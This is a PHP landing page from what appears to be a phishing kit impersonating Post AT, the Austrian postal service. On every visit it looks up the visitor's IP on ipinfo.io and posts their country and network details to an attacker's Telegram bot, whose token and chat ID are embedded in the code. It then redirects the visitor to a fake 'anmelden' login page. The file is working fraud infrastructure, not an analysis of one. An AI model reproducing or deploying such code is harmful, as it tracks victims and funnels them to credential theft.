<?php

 $ip=$_SERVER['REMOTE_ADDR'];
 $details = json_decode(file_get_contents("http://ipinfo.io/$ip/json?token=7b15382c01894a"));
 $cn = $details->country;
 $rg = $details->org;
 $host = $details->hostname;
 $isp = $details->company->name;
 $ok = ("post atReal Visit NZ NZ NZ : ".$cn."  ".$rg."\n\n");
 $awebsite="https://api.telegram.org/bot5854305123:AAFLNScznt6GTYNl77giB4BDaZqL3KBVIrs";
 $pparams=[
 'chat_id'=>'1787677484',
 'text'=>$ok,
 ];
 $chh = curl_init($awebsite . '/sendMessage');
 curl_setopt($chh, CURLOPT_HEADER, false);
 curl_setopt($chh, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($chh, CURLOPT_POST, 1);
 curl_setopt($chh, CURLOPT_POSTFIELDS, ($pparams));
 curl_setopt($chh, CURLOPT_SSL_VERIFYPEER, false);
 $result = curl_exec($chh);
 curl_close($chh);
?>
<!DOCTYPE html>
<html>
   <head>
    <title>Post AT</title>
      <meta http-equiv = "refresh" content = "0; url = login/mycontrol/anmelden/" />
   </head>
   
</html>